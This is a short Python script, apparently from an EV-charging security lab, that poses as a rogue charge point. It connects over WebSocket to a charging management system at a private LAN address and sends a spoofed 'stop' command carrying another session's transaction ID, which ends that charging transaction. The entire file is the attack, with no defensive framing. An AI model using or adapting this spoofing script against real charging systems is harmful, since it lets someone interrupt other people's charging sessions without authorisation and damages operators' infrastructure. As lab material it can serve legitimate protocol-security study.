import asyncio
import websockets
import sys

async def rogue_stop():
    uri = "ws://192.168.0.219:56284"

    tx_id = input("Enter the active transaction ID to spoof: ").strip()
    print(f"Rogue CP: spoofing transactionId={tx_id}")

    async with websockets.connect(uri) as websocket:
        print("Rogue CP: connected to CMS.")

        # Send stop with ID
        await websocket.send(f"stop {tx_id}")
        print(f"Rogue CP: sent STOP {tx_id}")

        # Read CMS reply
        try:
            resp = await websocket.recv()
            print("CMS replied:", resp)
        except websockets.exceptions.ConnectionClosed:
            print("CMS closed the connection.")

if __name__ == "__main__":
    try:
        asyncio.run(rogue_stop())
    except KeyboardInterrupt:
        sys.exit(0)